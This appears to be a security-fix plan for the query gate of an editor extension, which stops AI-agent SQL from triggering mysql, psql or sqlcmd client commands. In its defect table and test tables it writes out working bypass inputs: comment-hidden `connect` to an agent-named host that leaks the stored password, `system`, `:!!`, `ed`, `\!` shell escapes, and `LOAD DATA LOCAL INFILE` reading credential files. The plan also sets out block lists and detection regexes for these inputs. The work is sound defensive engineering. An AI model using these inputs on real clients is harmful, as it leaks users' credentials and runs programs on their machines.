# PLAN — The `query` action refuses every road from an agent's SQL to the client's own commands

> Status: **built, in review, 2026-11-06; approved the same day (epoch 1).** Built on `fix/query-refuses-client-commands`; the `coai` code round, the PR and the release are still to come. Scope:
> `src_vs_code/src/dbCliLauncher.ts`, its test, `src_vs_code/CHANGELOG.md`, `research/module_extension.md`,
> `todo/README.md`. Extension only; every door (local MCP, alias, token) goes through the same function. Security fix
> for a defect live on `main` and in every released version since 0.56.1. This text is the spec: a Sonnet coder builds
> from it alone, an Opus reviewer reads the result against it.

## Plan changes

> Epoch 1 · approved 2026-11-06 · by reviewers · state: open

  (The approving round was one round: the gate's `review_plan` reached `proceed` and the own review, started at the
  same time by the gate's own protocol, measured the plan against real clients. Both sets of findings are folded into
  the approved text below; nothing was built before it, so the epoch opens with no entries.)

## 1. The defect

`refuseQuery(dbType, query)` (`src_vs_code/src/dbCliLauncher.ts:88-117`) is the one gate between an agent's text and a
database client that holds the stored password in its environment (`PGPASSWORD`, `MYSQL_PWD`, `SQLCMDPASSWORD`;
`agentUseActions.ts:344-347` calls it, `buildDbQueryLaunch` re-checks at `:157`). The promise is that an agent USES
the credential without receiving it. Measured on 2026-11-06 by an Opus reviewer running the real function and real
clients against a fake server on loopback (mysql 8.4.11, mariadb 11.8.6 client 15.2, psql 18.6; Linux; nothing left
the machine), then checked a second time on the same harness by this plan's author the same day. Windows and sqlcmd
were not run; what is said about them comes from reading the clients' sources, named per row.

| # | Input that passes today | What the client then does | Measured |
|---|---|---|---|
| D1 | `connect somedb <host>` for `mysql` | `connect` is not in `MYSQL_CLIENT_WORDS` (`:59`). mysql 8.4.11 opened a connection to the host the query named, on the entry's port, went TLS without verification, accepted a `caching_sha2_password` full-auth request and **sent the stored password in plaintext** to that host. A second line after `select 1;` passes too. MariaDB 11.8.6 connected with an empty password | yes, both clients |
| D2 | `ssl_session_data_print <path>` for `mysql` | the word regex `/^([a-z]+)(?:\s|$)/` (`:104`) cannot match an underscore. Writes a laptop file | the gate; the write not run |
| D3 | `/* ; */ connect somedb <host>`, `/*`+NL+`*/ connect somedb <host>;`, `connect/*x*/ somedb <host>;`, `system/*x*/ id;` for `mysql` | the gate splits on `;` and newline **before** anything looks at comments, so a comment holding a `;` or a newline hides the word in a fragment that starts with `/*`; a comment right after the word defeats `(?:\s|$)`. Oracle, default options: the first two connected to the named host (`skip_over_comments_and_space`, `mysql.cc:2588`, applied at `:2466-2476` whenever the buffer is empty or holds only comments). MariaDB, default options: `connect/*x*/ …` connected, `system/*x*/ …` ran (comments are stripped by `add_line` when `preserve_comments` is off, which is its default, and the buffer is matched at the delimiter). Oracle with `skip-comments` in `my.cnf`: `system/*x*/ id` ran too. `/*+*/` and `/*!*/` work the same way | yes, both clients, 2,900 fuzz runs (§4.3) |
| D4 | `select 1`+CR+`:!! whoami` and `ed` for `mssql` | `split(/\r?\n/)` (`:89`) does not treat a bare CR as a line break. `ed` opens the editor named by the environment, which inherits `SQLCMDPASSWORD`. go-sqlcmd (what `toolCheck.ts:75-82` installs on all three platforms) does parse commands inside `-Q`: `pkg/sqlcmd/sqlcmd.go:133-136` resets the batch to the query string and calls `batch.Next`, whose `matchCommand` holds `(?im)^[\t ]*?:?ED(?:[ \t]+(.*$)|$)` (`pkg/sqlcmd/commands.go:101`); `removeComments` (`:143`) strips a trailing `-- x`, so `ED -- x` opens the editor. A bare CR is **not** a line start to that regex (`^` matches after `\n` only), so the CR row is margin there | source read, not run |
| D5 | `LOAD DATA LOCAL INFILE '<laptop file>' INTO TABLE t` for `mysql` | plain SQL to the gate. When the server answers with a `LOCAL INFILE` request, **mariadb 11.8.6 with no `my.cnf` shipped the file's contents**, though its `--help` prints `local-infile FALSE`; Oracle's default refused, and both shipped under `local-infile=1` in `[mysql]` or `[client]`. A malicious or agent-run server has `local_infile` on; `<home>/.pgpass` or a key file is the payload, and `select * from t` reads it back | yes, both clients, the matrix in §2.1 |

**The folded form, measured out.** The brief named a fullwidth backslash `＼` (U+FF3C) that a Windows C runtime's
best-fit narrowing would turn into `\` on a narrow `argv`. Checked client by client: psql's meta-command test is the
**first character** of the `-c` string and nothing else (`optarg[0] == '\\'`, `startup.c:555`, the same in 9.2, 10, 13
and master), so the leading space of §2.3 ends that road on every platform; measured on psql 18.6 that `\!`,
`;`+NL+`\!`, `\copy … to program`, `\g`, `:'PGPASSWORD'`, and a CR or tab first all reached the server as text behind
the space. Oracle's `mysql.exe` converts the UTF-16 command line to UTF-8 itself (`my_win_translate_command_line_args`,
`mysql.cc:1350`), so no best-fit happens and the brief's "defeated the same way" was wrong for the client
`toolCheck.ts:71` installs. MariaDB's client sets `activeCodePage` UTF-8 in its manifest (10.11 and 11.8, read by the
reviewer; Windows 1903 and later honour it). go-sqlcmd is Go, which takes the wide command line. **Unverified
leftovers:** the ODBC `sqlcmd.exe`, MariaDB clients before 10.6, and any client a person installed by another route.
§2.2 says what this plan does about them, and §5 what it does not.

Also found, in scope because the fix touches the same lines: the brief's premise that the launcher prefixes a space to
psql's `-c` string is **not on `main` at 8723fe2** (`:178` passes `query` as is), and no other branch carries it either
(`feat/remote-bridge-e1` checked), so adding it here cannot double it; the reviewer measured on psql 18.6 that a
leading space sends the whole string to the server as SQL, which §2.3 turns into a deliberate measure.

## 2. The rules, decided

The stance stays the one the file already states (`:74`): prove the shape, never sanitize. Every refusal is one sentence
that names nothing from the query except the word it refuses.

### 2.1 mysql: refuse the ten words with an effect; split on comment ends; pin three options

**The words.** The client's long-form commands (MySQL 8.4 `help` listing; MariaDB's is the same set without
`query_attributes`, `resetconnection` and `ssl_session_data_print`): `?`, `charset`, `clear`, `connect`, `delimiter`,
`edit`, `ego`, `exit`, `go`, `help`, `nopager`, `notee`, `nowarning`, `pager`, `print`, `prompt`, `query_attributes`,
`quit`, `rehash`, `resetconnection`, `source`, `ssl_session_data_print`, `status`, `system`, `tee`, `use`, `warnings`.
Short forms are all backslash forms and stay under the blanket backslash rule (`:96`, unchanged).

Judged one by one. The question is *does this word, at a statement start, do something on the laptop or to the
connection?* An earlier draft refused every word that is not SQL and called the loss nothing; that was false, because
this gate cannot tell a statement start from a line inside a statement, and agents write multi-line SQL:
`select *`+NL+`from jobs`+NL+`where`+NL+`  status = 3` runs today and a rule refusing `status` would have refused it, the
same for `warnings`, `print`, `charset`, `prompt`, `clear`, `go`, `exit`, `quit` as a column or alias alone on a line.

| Word | Effect in the client | Decision |
|---|---|---|
| `system`, `edit`, `pager`, `nopager` | runs a local program, environment inherited | refuse |
| `source`, `tee`, `notee`, `ssl_session_data_print` | reads or writes a laptop file | refuse |
| `connect` | opens a connection to an agent-named host with the stored password (D1) | refuse |
| `delimiter` | changes where the client splits statements, so a later command sits where this gate sees the middle of a statement | refuse |
| `charset`, `clear`, `ego`, `exit`, `go`, `nowarning`, `print`, `prompt`, `query_attributes`, `quit`, `rehash`, `resetconnection`, `status`, `warnings` | formats, prints, or ends the client; runs nothing, opens nothing, reads no file | allow: refusing them costs multi-line SQL and closes nothing |
| `use` | the client checks the name and sends `COM_INIT_DB` to the session's host; `use somedb <host>` reached no second host (measured, both clients) | allow |
| `help` | bare: prints the client's help; with an argument: sends `HELP 'x'` to the server (measured) | allow |
| `?` | prints the client's help; not a word, and a query starting with `?` is not SQL | not in the list |

So `MYSQL_CLIENT_WORDS` becomes exactly: `system`, `edit`, `pager`, `nopager`, `source`, `tee`, `notee`,
`ssl_session_data_print`, `connect`, `delimiter`. One list, one comment per group saying why, and a comment naming the
fourteen words judged harmless so a reader does not re-derive them.

**The fragments.** A command is recognised when the client's buffer is empty or holds only comments and whitespace,
which is true at the start of the `-e` string, after the delimiter, and (Oracle) after a comment of any shape. So the
query is split into fragments on **`/;|\r\n|\r|\n|\*\//`**: the delimiter, every line break shape, and the end of a
block comment, which is where a hidden word starts. There is **no comment-skipping helper**: skipping comments per
fragment is what left the road open (D3), because the split had already cut the comment in two. Each fragment is
`trimStart()`ed and lower-cased (`trimStart` removes a BOM U+FEFF and U+00A0 as well, which both clients ignore
before a command; measured), and its first word is matched with **`/^([a-z_]+)(?=\s|$|\/\*|#|--)/`**: a word may be
followed by whitespace, the end of the fragment, or the start of any comment, because `system/*x*/ id`,
`system#x`+NL and `system-- x`+NL all run. `[a-z_]` so that `ssl_session_data_print` is a word. A fragment whose word is
in the list is refused with the sentence `Refused: "<word>" is a mysql client command, not SQL. Client commands run
local programs or open connections with the password in their environment, so they are never accepted from an
agent.`

This form had 0 misses across the same 2,900 fuzz runs in which the comment-skipping form missed 50 (§4.3): evidence,
not proof, and the plan says so where it records it.

**Over-refusals, accepted and named.**
- The split ignores quotes, so `select 'a; system b'` is refused as `system` today and stays refused.
- A refused word alone on its own line inside a statement is refused: `select a,`+NL+`connect`+NL+`from t` runs today
  on both clients (it goes to the server as one query) and will be refused. `select a, connect from t` on one line
  passes, and so does `` `connect` `` on its own line, because a backtick is not a letter. The sentence names the
  word, the person rewrites. Parsing SQL to be exact would be the sanitizing the file refuses to do.

**Three pinned options on the launch.** `--named-commands` (`-G`) makes the long forms recognised at every line start;
a `[mysql]` or `[client]` section of a `my.cnf` the agent never sees can turn it on, and `delimiter=//` in the same
file changes the split. The launch does not pass `--no-defaults` on `main`, and **should not**: it would drop the
person's `ssl-ca`, `ssl-mode`, `default-character-set`, socket and `login-path` settings, which is real function.
Instead the launch passes explicit options, which win over option files by the client's own precedence; measured on
both clients that each beats its `my.cnf` counterpart, and that ordinary `select 1; select 2;` still runs under them:

| Option | What it pins | Measured |
|---|---|---|
| `--skip-named-commands` | long forms recognised only at a statement start, whatever `named-commands` in `[mysql]` or `[client]` says | `select 1`+NL+`system id` with `named-commands` in `my.cnf`: ran without the pin, did not run with it; both clients |
| `--delimiter=;` | the split the gate assumes, whatever `delimiter=//` in `my.cnf` says | `select 1// system id//` with `delimiter=//` in `my.cnf`: ran without the pin, went to the server as one query with it; both clients |
| `--local-infile=0` | the client answers no `LOCAL INFILE` request (D5) | matrix below |

| `LOAD DATA LOCAL INFILE` | mysql 8.4.11 | mariadb 11.8.6 |
|---|---|---|
| no `my.cnf`, no flag | refused by the client | **shipped** |
| no `my.cnf`, `--local-infile=0` | refused | refused |
| `local-infile=1` in `[mysql]` or `[client]`, no flag | shipped | shipped |
| `local-infile=1` in `my.cnf`, `--local-infile=0` | refused | refused |
| `load-data-local-dir=<dir>` in `my.cnf`, `--local-infile=0` | **shipped, from that folder** | option not read |

The last row is the flag's named gap: on Oracle's client, `load-data-local-dir` in an option file still lets a file
under that folder ship under `--local-infile=0`. Closing it needs `--no-defaults`, which this plan does not take (above);
it is written into the research paragraph and §7 as a known residue, not claimed covered. `--local-infile=0` is the same
kind of measure as refusing `source`: one argv element that stops the client reading a laptop file for the server.
It **changes the shipped local contract** the bridge plan names at its §8 (`feat/remote-bridge-e1` ·
`todo/PLAN_remote_bridge_scoped.md` §4.11 and §8, which planned the flag for bridged launches only and filed the local
flag as a todo): the measured MariaDB default decides it the other way, and the PR body says so in one sentence.

### 2.2 The folded form: a second pass on the NFKC text, nothing more

An earlier draft refused, on every platform, every character whose NFKC form is ASCII, plus a list derived from
Microsoft's best-fit tables. It is cut, for three reasons that stand on their own:

1. **It costs real data.** The NFKC rule refuses `，（）：；？`, U+3000, fullwidth digits, `－～`, U+00A0, `…`, `™`, `º`,
   `²`, so `select * from t where note = '山田（太郎）、東京都　新宿区，１２３'` is refused on a Linux laptop for no
   gain; and the fourteen Microsoft tables fold 344 code points to letters, `é ñ ü č ł ğ` among them, which contradicts
   the same draft's promise that accented Latin keeps working.
2. **It closes nothing otherwise open on the clients this extension installs** (§1, *the folded form*): psql's road
   ends at the leading space; Oracle's `mysql.exe` and go-sqlcmd read the wide command line; MariaDB's manifest asks for
   UTF-8.
3. The residue (an ODBC `sqlcmd.exe`, a MariaDB client before 10.6, a client installed another way) is about a narrow
   `argv` that **this plan cannot observe**; a rule written from a table of folds is a claim, not a measure
   (`security.md`, *a measure you have not observed working is a comment*).

What stays is small and costs nothing: **the same checks run a second time on `query.normalize('NFKC')`**, and the
query is refused only when that form is a client command by the rules of §2.1, §2.3 and §2.4 (about three lines: compute
the form once, run the per-type check on both, return the first refusal). So `＼! id` is refused for postgres (its
form begins with `\`) and for mysql (its form holds one), `ｓｙｓｔｅｍ id` is refused for mysql, and `：!! id` (U+FF1A)
is refused for mssql (its form begins with `:`), while `，` and `１２３` inside a string pass, because a comma is not a
command. The refusal is the ordinary sentence of the rule that fired; it
names the ASCII word or the word "backslash", never a code point of the original. What it is: margin against a client
that folds its `argv` and recognises what it folded to. What it is not: a proof about any such client, since none was
run, and best-fit folds characters NFKC leaves alone (`∖` U+2216, `¥` under code page 932); the research paragraph
names both limits.

### 2.3 psql: a leading space on `-c`, and the line-start rule stays as margin

psql takes the `-c` string as **one meta-command only when its first character is `\`** (`startup.c:555`); otherwise
the whole string is one request to the server, where a `\!` on any later line is a syntax error (reviewer, psql 18.6,
measured both ways: `select 1; \! touch m1` and `select 1;`+NL+`\! touch m2` reached the server as text, and a string
that began with a space did too). So `buildDbQueryLaunch` passes `' ' + query` at `:178`. That single space defeats
the first-character case on every platform: on Windows the first byte is the space whether or not a later character
folds. The existing "no line starts with a backslash" check (`:92`) stays as margin and as a readable refusal instead of a
server error, now over lines split by §2.4's one split. The space is asserted by a test, with the reason in the test's
name, so nobody removes it as whitespace; two existing assertions move with it (§3 step 3).

### 2.4 mssql: one line split for all three types; `ed` at a line start; no `-X`

- Lines are split on **`/\r\n|\r|\n|\*\//`** for all three types, in one constant: a bare CR is a line break to the
  gate even where a client does not read it so (go-sqlcmd does not; mysql does not without a `;` before it; margin is
  free), and the end of a block comment starts a line, so `/*x*/:!! id` is refused rather than relying on go-sqlcmd's
  comment reader (which does treat it as comment text, `batch.go`; the ODBC client was not run).
- `ed` joins `:` and `!!` at a line start (`:111`), matched with **`/^ed(?:\s|$)/i`** on the `trimStart()`ed line,
  because the lines of `:89` are not lower-cased; `ed -- x` is refused (go-sqlcmd strips the comment and opens the
  editor), `edition_id` is not. `GO`, `RESET`, `QUIT`, `EXIT` stay allowed: they end or reset, run nothing.
- **`-X` is not added, now or as a follow-up.** On go-sqlcmd `-X` of any value makes `useEnvVars()` false
  (`cmd/sqlcmd/sqlcmd.go:92-93`), after which `SQLCMDPASSWORD` is not read (`:748-749`) and the variables are
  initialised without the environment, so `SQLCMDUSER` is lost too (`:253`, `:761`): the launch, which passes both
  through the environment (`:195`, `:162`), would stop authenticating. The bridge plan's E1.6 carries the same `-X1`
  and has the same defect; that is reported to its branch, not edited here.

## 3. Build order

1. **RED tests first** (`src_vs_code/src/test/dbCliLauncher.test.ts`), one case per row of §4.1. Rows marked `RED`
   are watched failing against `main`'s function, with the failure messages kept for the summary; rows marked `guard`
   are watched passing before and after, and the test's name says it guards an allow or an existing refusal.
2. **Split `refuseQuery`** so each piece is under the repo's complexity limit of 4 (`eslint.config.mjs:32`) and the
   `eslint-disable-next-line complexity` at `:87` goes away rather than widening: `refusePostgres(lines)`,
   `refuseMysql(query)`, `refuseMssql(lines)`, a `refuseOnce(dbType, text)` dispatcher, and `refuseQuery` calling it on
   the text and on `text.normalize('NFKC')`. The word list and the two split regexes are module constants beside
   `MYSQL_CLIENT_WORDS`; the file is 211 lines and stays far under 800 (`eslint.config.mjs:30`).
3. **The launch changes**: `' ' + query` for psql at `:178`; `--skip-named-commands`, `--delimiter=;` and
   `--local-infile=0` for mysql, placed before `-e` (`:190`) and after the connection flags, so that a later merge
   with the bridge branch, which puts `--no-defaults` first on bridged launches only, keeps `--no-defaults` in first
   position (the client honours it there only); mssql's argv unchanged. Two existing assertions change in the same
   commit: `args.includes('select 1')` at test `:42` and `:75` becomes `args.includes(' select 1')`, and
   `args.indexOf('select 1') < sep` at `:99` becomes `args.indexOf(' select 1') < sep` with an `assert.notEqual(…, -1)`
   first, because `indexOf` returning `-1` made the old comparison vacuously true.
4. `npm run typecheck`, `npm test`, lint, in `src_vs_code`, at lowered priority.
5. **Documents**: a `### Fixed — security` entry under `## [Unreleased]` in `src_vs_code/CHANGELOG.md:7`; a paragraph
   under `research/module_extension.md:5031` (*Client meta-commands are a shell escape (0.56.1)*) recording D1-D5, the
   rules of §2, the versions and sources read, the fuzz record of §4.3 with its limits, and the two named residues
   (`load-data-local-dir`, the unverified narrow-`argv` clients); this plan's §7 filled; `todo/README.md`'s row; then
   promotion per planning-docs.
6. The `coai` code round on the finished branch (CLAUDE.md § Review gate); the PR body says how many reviewers
   answered and names the local-contract change of §2.1 in one sentence.

## 4. Test plan

### 4.1 Cases, exact inputs (`BS` = backslash, `NL` = newline, `CR` = carriage return)

`RED` = passes today, must fail before the fix and pass after. `guard` = already behaves as expected today, by design
or by the existing rule; watched passing before and after so a later edit cannot move it. Every input uses the sentinel
`ZQ9SENT` where an argument is needed, so the last row can test the sentence.

| Type | Input | Expected | Today |
|---|---|---|---|
| mysql | `connect ZQ9SENT 127.0.0.2`, `CONNECT ZQ9SENT 127.0.0.2`, `select 1;`+NL+`connect ZQ9SENT 127.0.0.2` | refused, sentence names `connect` | RED |
| mysql | `ssl_session_data_print ZQ9SENT` | refused, names `ssl_session_data_print` | RED |
| mysql | `delimiter //` | refused, names `delimiter` | RED |
| mysql | `/* ; */ connect ZQ9SENT`, `/*`+NL+`*/ connect ZQ9SENT;`, `connect/*x*/ ZQ9SENT;`, `system/*+*/ ZQ9SENT;`, `/*!*/ system ZQ9SENT;`, `system#x`+NL+`ZQ9SENT`, `system-- x`+NL+`ZQ9SENT`, `/*x*/connect ZQ9SENT`, `-- x`+NL+`connect ZQ9SENT`, `# x`+NL+`connect ZQ9SENT`, `  /* a */ /* b */ system ZQ9SENT` | refused, names the word | RED, all of them |
| mysql | `select 1`+CR+`system ZQ9SENT` | refused | RED (the client sends it to the server as one query; margin) |
| mysql | `select a,`+NL+`connect`+NL+`from t` | refused (the accepted over-refusal of §2.1) | RED |
| mysql | `ｓｙｓｔｅｍ ZQ9SENT` (fullwidth letters), `＼! ZQ9SENT` (U+FF3C) | refused, the mysql sentence of the rule that fired | RED |
| mysql | BOM (U+FEFF) + `system ZQ9SENT`, `select 1;`+CR+`system ZQ9SENT`, `system ZQ9SENT`, `source ZQ9SENT`, `tee ZQ9SENT`, `pager ZQ9SENT`, `select 1; system ZQ9SENT` | refused | guard (refused by today's list and split) |
| mysql | `use orders`, `USE orders;`, `help contents`, `HELP 'contents'`, `select system_user()`, `select * from pager_log`, `select * from connect_log`, `select status from jobs`, `select *`+NL+`from jobs`+NL+`where`+NL+`  status = 3`, `select id,`+NL+`  status`+NL+`from jobs`, `warnings`, `print`, `charset utf8mb4`, `prompt x`, `clear`, `status`, `select a, connect from t`, `` select `connect` ``+NL+`from t`, `sources x`, `connected` | allowed | guard |
| all three | `select 'Яблоко'`, `select '日本語'`, `select 'café'`, `select '🍎'`, `select '山田（太郎）、東京都　新宿区，１２３'`, `select '…'` | allowed | guard (the last two are what §2.2's cut buys) |
| mssql | `select 1`+CR+`:!! ZQ9SENT`, `/*x*/:!! ZQ9SENT`, `：!! ZQ9SENT` (U+FF1A) | refused | RED |
| mssql | `ed`, `  ED`, `ed -- x`, `select 1`+NL+`ed` | refused | RED |
| mssql | `:connect ZQ9SENT`, `select 1`+NL+`:!! ZQ9SENT` | refused | guard |
| mssql | `edition_id`, `select edited from t`, `select 1`+NL+`GO`, `RESET`, `select 1`+NL+`EXIT` | allowed | guard |
| postgres | `select 1`+CR+BS+`! ZQ9SENT`, `＼! ZQ9SENT` (U+FF3C) | refused | RED |
| postgres | BS+`! ZQ9SENT`, `select 1;`+NL+BS+`! ZQ9SENT` | refused | guard |
| postgres launch | `buildDbQueryLaunch('postgres', PG, 'select 1')` | `args[args.indexOf('-c') + 1] === ' select 1'`; the test's name says the space is the first-character defence | RED |
| mysql launch | argv contains `--skip-named-commands`, `--delimiter=;` and `--local-infile=0`, each before `-e`; no `--no-defaults` | — | RED |
| mssql launch | argv is byte for byte today's for the same input | — | guard |
| refusal text | for each refused input above, the sentence does not contain `ZQ9SENT` and does not contain `127.0.0.2` | — | guard on today's rows, RED on the new ones |

The last row is one test over every refused case. The sentinel replaces an earlier "second token" test, which
false-redded on `y` inside "they" and `x` inside "exit".

### 4.2 Mutation checks (each one must turn a test red)

- Remove `connect` from the word list → the `connect` rows go red.
- Change the word regex back to `[a-z]+` → the `ssl_session_data_print` row goes red.
- Remove `\*\/` from the fragment split → `/* ; */ connect ZQ9SENT` and `/*`+NL+`*/ connect ZQ9SENT;` go red.
- Restore `(?:\s|$)` in place of the lookahead → `connect/*x*/ ZQ9SENT;` and `system#x`+NL+`ZQ9SENT` go red.
- Remove `\r` from the line split → `select 1`+CR+`:!! ZQ9SENT`, `select 1`+CR+BS+`! ZQ9SENT` and
  `select 1`+CR+`system ZQ9SENT` go red.
- Drop the NFKC second pass → the `ｓｙｓｔｅｍ`, `＼!` and `：!!` rows go red.
- Drop the `/i` from the `ed` regex → `  ED` goes red; drop the `ed` rule → `ed -- x` goes red.
- Drop the leading space, or any one of the three mysql options → the launch rows go red.
- Re-add `status` or `use` to the word list → the multi-line `status` row or the `USE orders;` row goes red (the allow
  side is tested, not assumed).

### 4.3 The live check: what was run, and what the unit tests prove

The gate's accepted finding asked for a live check proving that a refused named command is not executed, and allows the
check to be run and recorded in a required environment where CI cannot provide a client. CI here installs no database
client (`.github/workflows/ci-extension.yml` installs `openssh-server` for the live ssh login, `:144-146`;
`ci-clients.yml` installs none), and a `--help` grep, which an earlier draft put there, would not have caught D3; it is
cut. The record is the reviewer's harness instead, kept with the session (`query-refuse-fuzz/`: `fuzz.py`,
`t1.py`-`t5.py`, `run.py`, `fake2.py`) and run on 2026-11-06:

- **Clients**: mysql 8.4.11-0ubuntu0.26.04.1, mariadb 11.8.6 (client 15.2), both downloaded Linux binaries; psql 18.6;
  each mysql/mariadb run with `--skip-named-commands --delimiter=;` against a fake server on loopback that logs every
  query, the login of a second loopback address, and any `LOCAL INFILE` reply.
- **Fuzz**: 2,900 runs across both clients and four `my.cnf` variants (none, `skip-comments`, `comments`,
  `named-commands`), inputs built from comment shapes, delimiters, line breaks, a BOM and quotes around `system` and
  `connect`; about 187 runs executed a command or logged in at the second address. The earlier gate (comment-skipping
  per fragment, `(?:\s|$)`) missed 50 of them; the form of §2.1 missed 0. Evidence, not proof: a sampled space, one
  version of each client, Linux.
- **Rows**: every measured sentence in §1 and §2 (D1, D3, D5, `use somedb <host>`, `help`, the two pinned options
  against their `my.cnf` counterparts, the `LOCAL INFILE` matrix, `select 1;`+CR+`system` running on Oracle) comes from
  `t1.py`-`t5.py`; this plan's author re-ran the key rows and the matrix on the same harness the same day with the same
  results.
- **Not run**: Windows (every client), sqlcmd of any version, psql.exe. What is said about them is a source read with
  the file and line named, and the research paragraph says so.

The unit tests prove the gate's answer for each input and the argv the launch builds; what a client does with a string
is proved by the record above and only for the versions in it. The bridge plan's E1.6 holds the real two-client CI test
against a fake server (its §4.11, *MariaDB, decided*), and this plan does not duplicate it.

## 5. Out of scope, said once

- The bridge work on `feat/remote-bridge-e1`: `--no-defaults` first and `-X` on bridged launches, the child's
  environment allow-list; that plan's §4.11 cites this fix and merges `main` afterwards. Two sentences there need
  correcting after this plan: its "folded form" sentence (this plan refuses no code points) and E1.6's `-X1`
  (§2.4: it drops the credential). Reported to that branch, not edited here.
- The local MCP door serving `connectionString` to a local agent (the same plan's D12 todo).
- `load-data-local-dir` in an Oracle option file under `--local-infile=0` (§2.1's matrix): closing it needs
  `--no-defaults`, which costs the person's TLS and socket settings; named as residue.
- A narrow-`argv` client this extension does not install (ODBC `sqlcmd.exe`, MariaDB before 10.6): §2.2's second pass
  is margin there, not coverage.
- What Windows best-fit does to Cyrillic today: under ACP 1252 a Cyrillic query reaches a narrow-`argv` client as `?`
  characters, wrong data rather than a leak; under ACP 1251 it survives. Filed in §7, not fixed here.
- `mongosh`, refused outright already.

## 6. Definition of Done

- [x] Every `RED` row of §4.1 was watched **failing** against the unchanged function, then passes; every `guard` row
      was watched passing before and after; the summary quotes one failure message and the pass.
- [x] Every mutation of §4.2 was tried and turned at least one test red.
- [x] `refuseQuery` carries no `eslint-disable` for complexity; there is no comment-skipping helper; `npm run typecheck`,
      `npm test` and lint are green in `src_vs_code` at lowered priority.
- [x] psql's `-c` string begins with a space; mysql's argv carries `--skip-named-commands`, `--delimiter=;` and
      `--local-infile=0` after the connection flags and before `-e`, and no `--no-defaults`; mssql's argv is unchanged.
- [x] `src_vs_code/CHANGELOG.md` has the `### Fixed — security` entry; `research/module_extension.md` records D1-D5, the
      rules, the versions and sources read, the fuzz record with its limits and the two residues; `todo/README.md`'s row
      matches; no real host, address or token anywhere in the diff.
- [ ] `coai`: the `review_plan` round reached `proceed` before step 1 (done, 2026-11-06), a `review_code` round ran on
      the finished branch, every finding resolved, the PR body reports the verdicts, how many reviewers answered, and
      the local-contract change of `--local-infile=0`.
- [ ] `node .claude/rules/shared/tools/plan-lifecycle.mjs` and `pin-check.mjs` pass; this plan is promoted with its
      deviations in the same task that finishes it.
- [ ] The owner has heard that a release must follow: `extension-v1.17.0` (published 2026-11-06) carries the defect.

## 7. Found along the way (filled by the coder; opened here)

- Windows best-fit turns Cyrillic and other non-1252 text into `?` before a narrow-`argv` client sees it: wrong data,
  silently, on a Western-code-page machine. Oracle's `mysql.exe` and go-sqlcmd read the wide command line and are not
  affected; psql.exe 17.5 reads the narrow one (imports `__p___argv` only, no `activeCodePage` in its manifest, read
  statically). A fix would spawn the client with a UTF-8 code page or a manifest it does not have. Separate plan.
- The brief's "leading space already on the launcher" was not on `main` and on no other branch; §2.3 adds it once.
- **Follow-up todo, not this fix:** Oracle's `--skip-commands` turns the client's command parser off outright, so
  `connect`, `system` and the comment-hidden forms go to the server as SQL (measured: nothing ran, nothing connected,
  `select 1; select 2` and `use orders; select 1` still ran); `--skip-system-command` stops `system` with an error
  naming the option. MariaDB has neither: `--loose-skip-commands` adds a warning line on stderr for every run, and
  `--sandbox` stopped `system` but **not** `connect` (measured, 11.8.6). A per-vendor flag needs a vendor probe at
  launch, which this plan does not add; the word list is vendor-free.
- `load-data-local-dir` under `--local-infile=0` on Oracle's client (§2.1's matrix): the one road `--no-defaults`
  would close, left open on purpose.
- **Filled by the coder, 2026-11-06.** Every `RED` and `guard` row of §4.1 behaved as marked against the unchanged
  function (29 individual inputs went red, no guard row did). The mssql sentence now says `":", "!!" or "ed"`, because the
  old sentence would have named a rule that is no longer the whole of it; it still names nothing from the query. `ed`
  followed directly by a comment (`ed/*x*/`) is not refused by the `ed` rule and was checked against go-sqlcmd's
  source: `batch.go` reads `/*` as a comment before it tries a command, and the `ED` regex needs whitespace or the end
  after `ED`, so it is not a command there (source read, not run; the ODBC `sqlcmd.exe` was not looked at). The fuzz of
  §4.3 was re-run on the finished tree through the compiled `refuseQuery`: 179 of 2,900 runs executed a command or
  logged in at the second address, the function refused 179, and the pre-fix function let 98 of the same 179 through.
- **Not observed:** psql and sqlcmd were not run against the finished tree (the launch is unit-tested for argv only); the
  mutation of §4.2 "drop the `ed` rule" cannot be applied by deleting the line (an unused constant fails the compile), so
  it was applied as `&& line === ''`.

## Epics

One epic, because the change is one function and one launch; its stories are here rather than in a document of their
own, by the gate's instruction for a plan this size. Fable wrote this spec (security judgement); Sonnet codes each
story from it; Opus reviews each against it.

Cornerstones: 1 of 1 — S1

### E1 · The gate and the launch, on `fix/query-refuses-client-commands`

- **Goal.** No input that passes `refuseQuery` makes `mysql`, `psql` or `sqlcmd` run a local program, read or write a
  laptop file, or open a connection to a host the agent named, on any door.
- **Scope.** §2 whole, §3, §4; the two documents and the README row of step 5.
- **Depends on.** Nothing; the gate's plan round is done.
- **Done when.** §6 is ticked and the code round has run.
- **Cornerstone area.** The gate itself (S1): a mistake here is a password leaving the laptop through a query that
  passes every test, and nothing downstream catches it.

**Stories.**

- **S1 · The gate** (cornerstone, `model: fable` for the spec, which is §2.1, §2.2, §2.4 and §4.1-4.2 as written).
  `refuseQuery` split per §3 step 2; the ten-word list; the fragment and line splits; the lookahead word regex; the
  `ed` rule; the NFKC second pass; every `RED` and `guard` row of §4.1 except the three launch rows; every mutation of
  §4.2 except the launch one. RED first, failure messages kept. Complete on its own: the launch is unchanged, so the
  existing launch tests stay green.
- **S2 · The launch and the record.** `' ' + query` for psql; the three mysql options; the two existing assertions
  moved (§3 step 3); the three launch rows and the launch mutation of §4.2; the CHANGELOG entry, the
  `module_extension.md` paragraph, this plan's §7 and the `todo/README.md` row; then the code round and the PR with the
  local-contract sentence. Follows S1, because the paragraph records S1's rules as built.
